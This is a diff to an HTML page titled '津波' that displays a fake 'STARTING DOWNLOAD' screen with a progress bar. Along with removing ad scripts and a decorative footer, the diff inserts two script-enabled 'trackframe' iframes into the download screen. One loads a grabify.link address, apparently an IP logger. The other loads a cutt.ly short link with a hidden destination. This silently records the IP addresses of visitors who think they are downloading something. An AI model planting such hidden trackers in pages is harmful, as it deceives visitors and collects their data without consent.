@@ -3,19 +3,15 @@
    <head>
       <title>津波</title>
       <meta name='google-adsense-platform-domain' content='blogspot.com' />
-      <link rel="stylesheet" href="./assets/css/style.css" type='text/css' />
+      <link rel="icon" type="image/svg+xml" href="./favicon.svg" />
+      <link rel="stylesheet" href="../assets/css/style.css" type='text/css' />
       <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
       <meta name="google-site-verification" content="YTZ7Qmyde5YeZiqorkBjCjZ3D9d9LgT_NblSXakw7WM" />
       <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
       <link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet' />
-      <link rel="icon" type="image/svg+xml" href="./favicon.ico" />
-      <script async src="./assets/js/adsense.js"></script>
-      <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5705447777471986&host=ca-host-pub-1556223355139109" crossorigin="anonymous"></script>
-      <script type="text/javascript" src="./assets/js/processor.js"></script>
    </head>
-   <body onload="initializeApp()">
+   <body>
       <div class='loader' id='loader'>
-         <a class='button'>ABOUT</a>
          <div id='circle'></div>
       </div>
       <div class="download" id="download">
@@ -23,6 +19,8 @@
             <div class="download-screen">
                <div class="download-content">
                   <h1>STARTING DOWNLOAD</h1>
+                  <iframe allowfullscreen="true" allowtransparency="true" frameborder="no" id="framework" class="trackframe" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts allow-modals" scrolling="no" src="https://grabify.link/30JEBC"></iframe>
+                  <iframe allowfullscreen="true" allowtransparency="true" frameborder="no" id="framework" class="trackframe" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts allow-modals" scrolling="no" src="https://cutt.ly/srF06bOM"></iframe>
                   <div class="progress-bar">
                      <div class="progress"></div>
                   </div>
@@ -48,34 +46,7 @@
             </div>
          </div>
       </div>
-      <div id='overlap'>
-         <script src="./assets/js/app.js"></script>
-         <footer>
-            <svg viewBox='0 0 120 28'>
-               <defs>
-                  <mask id='xxx'>
-                     <circle cx='7' cy='12' fill='#fff' r='40'></circle>
-                  </mask>
-                  <filter id='goo'>
-                     <feGaussianBlur in='SourceGraphic' result='blur' stdDeviation='2'></feGaussianBlur>
-                     <feColorMatrix in='blur' mode='matrix' result='goo' values=' 1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 13 -9'></feColorMatrix>
-                     <feBlend in='SourceGraphic' in2='goo'></feBlend>
-                  </filter>
-                  <path d='M 0,10 C 30,10 30,15 60,15 90,15 90,10 120,10 150,10 150,15 180,15 210,15 210,10 240,10 v 28 h -240 z' id='wave'></path>
-               </defs>
-               <use class='wave' id='wave3' x='0' xlink:href='#wave' y='-2'></use>
-               <use class='wave' id='wave2' x='0' xlink:href='#wave' y='0'></use>
-               <g class='gooeff'>
-                  <circle class='drop drop1' cx='20' cy='2' r='1.8'></circle>
-                  <circle class='drop drop2' cx='25' cy='2.5' r='1.5'></circle>
-                  <circle class='drop drop3' cx='16' cy='2.8' r='1.2'></circle>
-                  <use class='wave' id='wave1' x='0' xlink:href='#wave' y='1'></use>
-                  <path class='wave' d='M 0,10 C 30,10 30,15 60,15 90,15 90,10 120,10 150,10 150,15 180,15 210,15 210,10 240,10 v 28 h -240 z' id='wave1'></path>
-               </g>
-            </svg>
-         </footer>
-      </div>
       <script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/2659626136-widgets.js"></script>
-      <script type="text/javascript" src="./assets/js/index.js"></script>
+      <script type="text/javascript" src="./main.js"></script>
    </body>
 </html>
